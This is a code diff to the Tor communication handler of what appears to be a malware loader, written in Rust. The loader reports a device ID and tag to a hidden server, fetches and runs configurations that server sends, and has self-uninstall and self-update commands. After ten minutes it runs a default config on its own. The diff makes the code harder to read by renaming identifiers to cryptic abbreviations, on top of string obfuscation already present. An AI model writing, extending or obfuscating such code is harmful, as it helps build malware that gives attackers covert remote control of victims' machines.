@@ -3,25 +3,25 @@ use anyhow::{ Context, Result };
 use loader_vars::{
     constants::{ loader_tag, loader_version },
     types::{
-        receive::{ self, ClientParams, LoaderReceivePayload, RunConfigParams },
-        send::{ GetConfigParams, LoaderSendPayload, ServerAction, ServerParams },
+        receive::{ self, ClPrms, LdrRcv, RnCnfgPrms },
+        send::{ GtCnfgPrms, LdrSnd, SrvAct, SrvPrms },
     },
 };
-use shared::network::tor::{ LoggerConfig, MutexPtr, RwPtr, ServerReceiveType, TorHandler };
+use shared::network::tor::{ LoggerCnfg, MutexPtr, RwPtr, SrvRcvTp, TrHandler };
 use obfstr::obfstr as s;
 use super::utils::run_config;
 
 #[derive(Clone)]
-pub struct LoaderTorHandler {
-    tor_handler: TorHandler,
-    config_executed: MutexPtr<bool>,
+pub struct LdrTrHandler {
+    tr_handler: TrHandler,
+    cnfg_done: MutexPtr<bool>,
 }
 
-impl LoaderTorHandler {
-    pub async fn new(logger_config: LoggerConfig) -> Result<Self> {
-        let tor_handler = TorHandler::new(logger_config).await?;
+impl LdrTrHandler {
+    pub async fn new(logger_config: LoggerCnfg) -> Result<Self> {
+        let tor_handler = TrHandler::new(logger_config).await?;
         let config_executed = Arc::new(Mutex::new(false));
-        Ok(LoaderTorHandler { tor_handler, config_executed })
+        Ok(LdrTrHandler { tr_handler: tor_handler, cnfg_done: config_executed })
     }
 
     pub async fn run_handler(&mut self) {
@@ -33,14 +33,14 @@ impl LoaderTorHandler {
         std::thread::spawn(move || {
             std::thread::sleep(Duration::from_secs(60 * 10));
             let binding = self_clone3.write().unwrap();
-            let mut run_config_done = binding.config_executed.lock().unwrap();
+            let mut run_config_done = binding.cnfg_done.lock().unwrap();
             if !*run_config_done {
-                run_config(RunConfigParams::default()).unwrap();
+                run_config(RnCnfgPrms::default()).unwrap();
                 *run_config_done = true;
             }
         });
 
-        self.tor_handler.run(
+        self.tr_handler.run(
             move || {
                 Self::connect_callback_init(self_clone.clone());
             },
@@ -48,13 +48,13 @@ impl LoaderTorHandler {
         ).await;
     }
     pub fn connect_callback_init(self_ref: RwPtr<Self>) {
-        let params = GetConfigParams { tag: loader_tag() };
+        let params = GtCnfgPrms { tag: loader_tag() };
 
         if
             let Err(_error) = Self::send_data(
-                &self_ref.read().unwrap().tor_handler,
-                ServerAction::GetConfig,
-                ServerParams::GetConfig(params)
+                &self_ref.read().unwrap().tr_handler,
+                SrvAct::GtCnfg,
+                SrvPrms::GtCnfg(params)
             )
         {
             // err
@@ -62,11 +62,11 @@ impl LoaderTorHandler {
     }
 
     fn process_data(
-        tor_handler: TorHandler,
+        tor_handler: TrHandler,
         binary_data: Vec<u8>,
         self_ref: RwPtr<Self>
     ) -> Result<()> {
-        let processed_data: LoaderReceivePayload = serde_json
+        let processed_data: LdrRcv = serde_json
             ::from_slice(&binary_data)
             .context(s!("Failed to parse binary data as LoaderReceivePayload").to_string())?;
 
@@ -74,16 +74,16 @@ impl LoaderTorHandler {
     }
 
     fn route_data(
-        _tor_handler: TorHandler,
-        processed_data: LoaderReceivePayload,
+        _tor_handler: TrHandler,
+        processed_data: LdrRcv,
         self_ref: RwPtr<Self>
     ) -> Result<()> {
         match processed_data.action {
-            receive::ClientAction::RunConfig => {
-                if let ClientParams::RunConfig(params) = processed_data.params {
+            receive::ClAct::RnCnfg => {
+                if let ClPrms::RnCnfg(params) = processed_data.params {
                     if let Ok(()) = run_config(params) {
                         let binding = self_ref.write().unwrap();
-                        let mut run_config_done = binding.config_executed.lock().unwrap();
+                        let mut run_config_done = binding.cnfg_done.lock().unwrap();
                         *run_config_done = true;
                     }
                 } else {
@@ -94,18 +94,14 @@ impl LoaderTorHandler {
                     );
                 }
             }
-            receive::ClientAction::UninstallSelf => {}
-            receive::ClientAction::UpdateSelf => {}
+            receive::ClAct::UnsSlf => {}
+            receive::ClAct::UpdSlf => {}
         }
         Ok(())
     }
-    fn send_data(
-        tor_handler: &TorHandler,
-        action: ServerAction,
-        params: ServerParams
-    ) -> Result<()> {
-        let payload = LoaderSendPayload {
-            id: tor_handler.constant_device_id.read().unwrap().to_owned(),
+    fn send_data(tor_handler: &TrHandler, action: SrvAct, params: SrvPrms) -> Result<()> {
+        let payload = LdrSnd {
+            id: tor_handler.dv_id.read().unwrap().to_owned(),
             version: loader_version(),
             action,
             params,
@@ -115,6 +111,6 @@ impl LoaderTorHandler {
             ::to_vec(&payload)
             .context(s!("Failed to serialize ServerReceive struct to binary data").to_string())?;
 
-        tor_handler.add_to_send_queue(ServerReceiveType::Loader, binary_data)
+        tor_handler.add_to_send_queue(SrvRcvTp::Ldr, binary_data)
     }
 }
